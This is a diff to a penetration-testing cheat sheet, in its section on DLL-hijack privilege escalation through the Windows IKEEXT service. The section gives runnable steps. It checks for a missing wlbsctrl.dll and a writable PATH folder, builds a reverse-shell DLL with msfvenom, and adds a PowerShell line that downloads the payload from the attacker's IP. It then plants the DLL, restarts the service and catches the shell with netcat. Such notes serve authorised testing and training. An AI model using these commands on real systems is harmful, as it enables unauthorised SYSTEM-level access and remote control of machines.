@@ -286,12 +286,14 @@ DLL Hijack
 Example: Vista/Win8
 
 sc query IKEEXT          ..Want LocalSystem 
-c:> dir wlbsctrl.dll /s  ..Want Missing 
+c:> dir wlbsctrl.dll /s  ..Want Missing (Normally C:\Windows\System32\wlbsctrl.dll)
 echo %path%              ..Want Exploitable-Path 
 cacls "C:\Python27"      ..Want Authenticated Users (M) 
 accesssschk.exe -dqv "C:\Python27" 
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.162.46 LPORT=445 -f dll > shell.dll  
+powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.162.46/shell.dll', 'C:\Python27\wlbsctrl.dll')" 
 copy shell.dll C:\Python27\wlbsctrl.dll 
+sc restart IKEEXT
 shutdown -r -t 10 && exit   
 rlwrap nc -nvlp 445 
 
